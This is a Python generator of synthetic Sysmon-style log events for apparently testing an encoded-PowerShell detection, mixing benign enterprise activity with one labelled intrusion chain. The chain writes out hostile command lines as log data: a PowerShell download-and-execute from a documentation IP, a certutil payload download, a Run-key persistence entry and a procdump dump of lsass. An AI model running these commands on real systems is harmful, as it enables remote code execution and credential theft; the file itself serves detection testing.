from __future__ import annotations

import base64
import hashlib
import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any


HOSTS = ["WS-FIN-023", "WS-HR-014", "WS-ENG-042", "SRV-FILE-02", "SRV-APP-07"]
USERS = ["j.singh", "a.kapoor", "m.iyer", "svc_sccm", "svc_backup", "r.shah"]
DOMAIN = "NEXUS"
SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"


def stable_id(*parts: str) -> str:
    return hashlib.sha256(":".join(parts).encode()).hexdigest()[:32]


def encoded_powershell(script: str) -> str:
    return base64.b64encode(script.encode("utf-16le")).decode()


def base_event(ts: datetime, host: str, user: str, event_id: int, uid: str, malicious: bool, scenario: str, expected: bool = False) -> dict[str, Any]:
    return {
        "@timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": {"name": host, "id": stable_id("host", host), "os": {"type": "windows"}},
        "user": {"name": user, "domain": DOMAIN, "id": stable_id("user", DOMAIN, user)},
        "winlog": {"event_id": event_id, "channel": SYSMON_CHANNEL, "provider_name": "Microsoft-Windows-Sysmon"},
        "labels": {"environment": "training-production-sim", "sensor": "sysmon", "dataset_version": "1.0"},
        "lab": {"expected": expected, "malicious": malicious, "scenario": scenario, "event_uid": uid},
    }


def process_event(ts: datetime, host: str, user: str, image: str, command: str, parent_image: str, parent_command: str, pid: int, ppid: int, malicious: bool, scenario: str, expected: bool = False, uid: str | None = None) -> dict[str, Any]:
    uid = uid or stable_id(ts.isoformat(), host, str(pid), command)
    event = base_event(ts, host, user, 1, uid, malicious, scenario, expected)
    entity = stable_id(host, str(pid), ts.isoformat())
    parent_entity = stable_id(host, str(ppid), (ts - timedelta(seconds=2)).isoformat())
    event.update({
        "event": {"category": "process", "type": "start", "code": "1", "action": "process-created"},
        "process": {
            "name": image.rsplit("\\", 1)[-1], "executable": image, "command_line": command,
            "entity_id": entity, "pid": pid, "hash": {"sha256": hashlib.sha256(command.encode()).hexdigest()},
            "parent": {"name": parent_image.rsplit("\\", 1)[-1], "executable": parent_image, "command_line": parent_command, "entity_id": parent_entity, "pid": ppid},
        },
    })
    return event


def network_event(ts: datetime, host: str, user: str, image: str, pid: int, destination_ip: str, destination_port: int, malicious: bool, scenario: str) -> dict[str, Any]:
    uid = stable_id(ts.isoformat(), host, image, destination_ip, str(destination_port))
    event = base_event(ts, host, user, 3, uid, malicious, scenario)
    event.update({
        "event": {"category": "network", "type": "connection", "code": "3", "action": "network-connection"},
        "process": {"name": image.rsplit("\\", 1)[-1], "executable": image, "entity_id": stable_id(host, str(pid)), "pid": pid},
        "source": {"ip": "10.20.4.23", "port": 51542},
        "destination": {"ip": destination_ip, "port": destination_port, "domain": "cdn-update.example.test" if malicious else "management.nexus.example"},
        "network": {"transport": "tcp", "direction": "egress"},
    })
    return event


def file_event(ts: datetime, host: str, user: str, image: str, path: str, malicious: bool, scenario: str) -> dict[str, Any]:
    uid = stable_id(ts.isoformat(), host, path)
    event = base_event(ts, host, user, 11, uid, malicious, scenario)
    event.update({
        "event": {"category": "file", "type": "creation", "code": "11", "action": "file-created"},
        "process": {"name": image.rsplit("\\", 1)[-1], "executable": image},
        "file": {"path": path, "name": path.rsplit("\\", 1)[-1], "hash": {"sha256": hashlib.sha256(path.encode()).hexdigest()}},
    })
    return event


def registry_event(ts: datetime, host: str, user: str, image: str, path: str, data: str, malicious: bool, scenario: str) -> dict[str, Any]:
    uid = stable_id(ts.isoformat(), host, path, data)
    event = base_event(ts, host, user, 13, uid, malicious, scenario)
    event.update({
        "event": {"category": "registry", "type": "change", "code": "13", "action": "registry-value-set"},
        "process": {"name": image.rsplit("\\", 1)[-1], "executable": image},
        "registry": {"path": path, "value": path.rsplit("\\", 1)[-1], "data": data},
    })
    return event


def malicious_chain(start: datetime) -> list[dict[str, Any]]:
    host, user, scenario = "WS-FIN-023", "j.singh", "encoded_powershell_intrusion"
    script = "Invoke-WebRequest -Uri hxxp://203.0.113.77/stage.ps1 -UseBasicParsing | Invoke-Expression"
    encoded = encoded_powershell(script)
    powershell = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    events = [
        process_event(start, host, user, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r'WINWORD.EXE "Q3_Bonus_Adjustment.docm"', r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE", 4820, 2016, True, scenario),
        process_event(start + timedelta(seconds=4), host, user, powershell, f"powershell.exe -NoProfile -WindowStyle Hidden -encodedcommand {encoded}", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r'WINWORD.EXE "Q3_Bonus_Adjustment.docm"', 5388, 4820, True, scenario, True, "mal-encoded-powershell-1"),
        network_event(start + timedelta(seconds=7), host, user, powershell, 5388, "203.0.113.77", 443, True, scenario),
        process_event(start + timedelta(seconds=12), host, user, r"C:\Windows\System32\certutil.exe", r"certutil.exe -urlcache -split -f hxxp://203.0.113.77/update.bin C:\Users\Public\update.exe", powershell, f"powershell.exe -encodedcommand {encoded}", 5520, 5388, True, scenario),
        file_event(start + timedelta(seconds=15), host, user, r"C:\Windows\System32\certutil.exe", r"C:\Users\Public\update.exe", True, scenario),
        process_event(start + timedelta(seconds=19), host, user, r"C:\Users\Public\update.exe", r"C:\Users\Public\update.exe /silent", powershell, f"powershell.exe -encodedcommand {encoded}", 5712, 5388, True, scenario),
        registry_event(start + timedelta(seconds=25), host, user, r"C:\Users\Public\update.exe", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHealth", r"C:\Users\Public\update.exe /silent", True, scenario),
        process_event(start + timedelta(seconds=31), host, user, powershell, f"pwsh.exe -enc {encoded}", r"C:\Users\Public\update.exe", r"C:\Users\Public\update.exe /silent", 5904, 5712, True, scenario, True, "mal-encoded-powershell-2"),
        process_event(start + timedelta(seconds=38), host, user, r"C:\Tools\procdump64.exe", r"procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\debug.dmp", r"C:\Users\Public\update.exe", r"C:\Users\Public\update.exe /silent", 6080, 5712, True, scenario),
        file_event(start + timedelta(seconds=43), host, user, r"C:\Tools\procdump64.exe", r"C:\ProgramData\debug.dmp", True, scenario),
        network_event(start + timedelta(seconds=51), host, user, r"C:\Users\Public\update.exe", 5712, "198.51.100.44", 8443, True, scenario),
    ]
    return events


def benign_baseline(start: datetime, count: int = 220, seed: int = 20260710) -> list[dict[str, Any]]:
    rng = random.Random(seed)
    events: list[dict[str, Any]] = []
    commands = [
        (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"powershell.exe -NoProfile Get-Service WinDefend", r"C:\Windows\explorer.exe", r"explorer.exe"),
        (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"powershell.exe -File C:\Company\Scripts\Inventory.ps1", r"C:\Windows\System32\taskeng.exe", r"taskeng.exe {A1B2-C3D4}"),
        (r"C:\Windows\System32\cmd.exe", r"cmd.exe /c ipconfig /all", r"C:\Windows\explorer.exe", r"explorer.exe"),
        (r"C:\Windows\System32\wevtutil.exe", r"wevtutil.exe qe System /c:20 /f:text", r"C:\Windows\System32\cmd.exe", r"cmd.exe /c healthcheck.cmd"),
        (r"C:\Windows\System32\certutil.exe", r"certutil.exe -verify C:\Company\Certificates\vpn.cer", r"C:\Windows\System32\mmc.exe", r"mmc.exe certlm.msc"),
        (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"powershell.exe -ExecutionPolicy RemoteSigned -File C:\Company\Scripts\PatchStatus.ps1", r"C:\Program Files\Microsoft Configuration Manager\CcmExec.exe", r"CcmExec.exe"),
    ]
    for index in range(count):
        image, command, parent, parent_command = rng.choice(commands)
        host, user = rng.choice(HOSTS), rng.choice(USERS)
        ts = start + timedelta(seconds=index * rng.randint(8, 25))
        events.append(process_event(ts, host, user, image, command, parent, parent_command, 3000 + index, 1200 + index, False, "enterprise_baseline", False, f"benign-process-{index:04d}"))
        if index % 11 == 0:
            events.append(network_event(ts + timedelta(seconds=1), host, user, image, 3000 + index, "192.0.2.25", 443, False, "enterprise_baseline"))
    management_script = "Invoke-Command -ComputerName localhost -ScriptBlock { Get-CimInstance Win32_OperatingSystem }"
    management_encoded = encoded_powershell(management_script)
    events.append(process_event(start + timedelta(minutes=18), "WS-HR-014", "svc_sccm", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"powershell.exe -EncodedCommand {management_encoded}", r"C:\Program Files\Microsoft Configuration Manager\CcmExec.exe", r"CcmExec.exe", 8400, 8300, False, "approved_software_management", False, "benign-encoded-sccm"))
    return events


def generate(output: Path) -> dict[str, int]:
    now = datetime.now(timezone.utc).replace(microsecond=0)
    events = benign_baseline(now - timedelta(minutes=35)) + malicious_chain(now - timedelta(minutes=4))
    events.sort(key=lambda event: event["@timestamp"])
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text("\n".join(json.dumps(event, separators=(",", ":")) for event in events) + "\n", encoding="utf-8")
    return {"total": len(events), "malicious": sum(bool(event["lab"]["malicious"]) for event in events), "expected_target_matches": sum(bool(event["lab"]["expected"]) for event in events)}


if __name__ == "__main__":
    target = Path("datasets/generated/production_simulation.ndjson")
    print(json.dumps(generate(target), indent=2))
